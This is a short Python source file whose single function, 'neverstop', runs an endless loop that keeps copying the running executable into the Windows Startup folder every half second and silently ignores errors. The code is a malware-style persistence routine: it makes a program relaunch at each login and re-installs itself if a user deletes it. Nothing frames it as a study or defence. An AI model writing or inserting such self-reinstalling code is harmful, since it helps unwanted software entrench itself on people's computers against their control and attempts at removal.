import os
import shutil
import subprocess
import sys
import time

def neverstop():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = sys.executable
    
    while True:
        if not os.path.exists(os.path.join(startup_folder, os.path.basename(exe_path))):
            try:
                shutil.copy(exe_path, startup_folder)
            except Exception:
                pass
        time.sleep(0.5)